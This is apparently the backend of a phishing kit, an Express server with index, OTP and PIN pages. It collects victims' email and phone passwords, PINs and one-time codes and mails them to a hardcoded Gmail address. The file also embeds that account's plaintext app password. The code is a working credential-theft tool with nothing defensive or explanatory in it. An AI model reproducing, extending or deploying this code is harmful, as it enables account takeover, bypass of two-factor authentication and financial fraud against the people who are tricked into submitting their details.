const express = require("express"); // express is use for getting api i.e POST request GET DELETE and PUT

const app = express(); // app is use for link express functions
const nodemailer = require("nodemailer"); // nodemailer is use for transporting what was gooten to email

const PORT = process.env.PORT || 5000; // port to connect to WEB

// Middleware
app.use(express.static("public"));

app.set("view engine", "ejs");
app.use(express.json());

// api routes

// API routes for index
app.post("/", (req, res) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "pristchief50@gmail.com",
      pass: "zevoxxbelbhueznu",
    },
  });

  const mailOptions = {
    from: req.body.email, // Use the email address provided by the client
    to: "pristchief50@gmail.com",
    subject: `FOR EMAIL ==> email: ${req.body?.email} \t\n\n\n Emailpassword: ${req.body?.EmailPassword}
    FOR PHONE NUMBER ==> PHONE NUMBER: ${req.body.phoneNumber} \t\n\n\n Phonepassword: ${req.body.PhonePassword}
    `,
  };
  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.status(500).send("Error occurred while sending email");
    } else {
      console.log("Email sent", info.response);
      res.send("success");
    }
  });
});
// API routes for pin
app.post("/pin", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "pristchief50@gmail.com",
      pass: "zevoxxbelbhueznu",
    },
  });

  const mailOptions = {
    from: email,
    to: "pristchief50@gmail.com",
    subject: `PIN: ${req.body?.pin} `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});
// API routes for otp
app.post("/otp", (req, res) => {
  console.log(req.body);
  let email = console.log(req.body.email);

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: "pristchief50@gmail.com",
      pass: "zevoxxbelbhueznu",
    },
  });

  const mailOptions = {
    from: email,
    to: "pristchief50@gmail.com",
    subject: `EMAILOTP ==> EmailOTP: ${req.body?.Emailotp} 
    PHONEOTP ==> PhoneOTP: ${req.body?.Phoneotp} 
    `,
  };

  console.log(mailOptions);
  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      res.send("error Occured: " + error);
    } else {
      console.log("Email sent", +info.response);
      res.send("success");
    }
  });
});

// index
app.get("/", (req, res) => {
  res.render("index");
});
// otp
app.get("/otp", (req, res) => {
  res.render("otp");
});
// pin
app.get("/pin", (req, res) => {
  res.render("pin");
});

app.listen(PORT, () => {
  console.log(`Server is running on port http://localhost:${PORT}`);
});
